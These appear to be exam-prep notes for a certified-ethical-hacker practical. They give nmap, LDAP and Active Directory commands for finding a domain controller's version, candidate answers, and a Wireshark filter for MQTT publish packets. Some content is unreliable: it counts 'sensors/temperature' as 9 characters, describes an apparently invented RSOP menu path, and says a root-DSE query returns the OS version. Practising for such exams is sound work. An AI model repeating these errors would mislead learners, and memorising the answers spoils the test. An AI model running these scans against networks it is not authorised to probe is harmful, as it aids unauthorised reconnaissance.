**Challenge 1**:

Perform an extensive scan of the target network and identify the Product Version of the Domain Controller. (Format: NN.N.NNNNN)

`scan for port 389 for all 3 networks`

```bash
Run an initial ping scan to discover live hosts:
nmap -sn 192.168.1.0/24
Run a detailed scan on discovered hosts, Save the output to a file for later analysis:
nmap -A -oN scan_results.txt 192.168.1.0/24
or
nmap --script smb-os-discovery -p 445 <DC-IP-Address>
---
nmap -A -p389 10.10.10.0/24
nmap -p 88,135,139,389,445 --script smb-os-discovery 192.168.1.100
#Nmap has a built-in script called ldap-rootdse that can query LDAP servers 
#for detailed information, including domain information. Run the following command:
nmap --script ldap-rootdse -p 389 <DC_IP>
#10.0.20348
#10.0.17763
ldapsearch -x -h <DC_IP> -b “DC=CEH,DC=com”
#queries the root DSE (Directory Server Agent) of the LDAP server and should 
#return the operating system version of the Domain Controller.
ldapsearch -x -h <DC_IP> -s base "(objectClass=*)" operatingSystemVersion
gpresult /r
---
1) powershell
Get-ADDomainController -Filter * | Select-Object Name,OperatingSystem,OperatingSystemVersion
2) cmd
nltest /dclist:yourdomain
#Replace yourdomain with your actual domain name. 
#This command will list all the domain controllers in your network.
#Identify the primary domain controller (PDC) and get its name.
#Run the following command to query the PDC:
wmic /node:DCName os get Caption,Version
#Replace DCName with the name of your domain controller obtained from the previous step. 
#This command will output the operating system version, 
#which includes the build number in the format NN.N.NNNNN.
3)Using Active Directory Users and Computers (GUI)
Open Active Directory Users and Computers:
Press Win + R, type dsa.msc, and press Enter.
Navigate to the Domain Controllers container.
In the left pane, expand your domain and click on the "Domain Controllers" container.
Right-click on the domain controller and select "Properties."
Check the "Operating System" tab:
Here you will see the operating system version of the domain controller.
4) Using RSOP (Resultant Set of Policy)
Open the Resultant Set of Policy (RSOP) tool:
Press Win + R, type rsop.msc, and press Enter.
Navigate to the "Computer Configuration" section.
Check the version information under "Administrative Templates" -> "System" -> "Version Reporting."
```

**Challenge 18**:

Analyze the traffic capture from an IoT network located in the Documents folder of the "EH Workstation – 1" (ParrotSecurity) machine, identify the packet with IoT Publish Message, and enter the topic length as the answer. (Format: N)

`mqtt.msgtype == 3`

```bash
Look through the filtered packetsto find an MQTT Publish Message.Each
MQTT Publish message has a topic associated with it.
Once you locate an MQTT Publishmessage, examine the topic field
The topic length is the number of characters or bytesthatmake up the topic string.
If, forinstance, you find an MQTT Publishmessage with a topic length of 9 characters,such as
sensors/temperature , then the answer would be 9
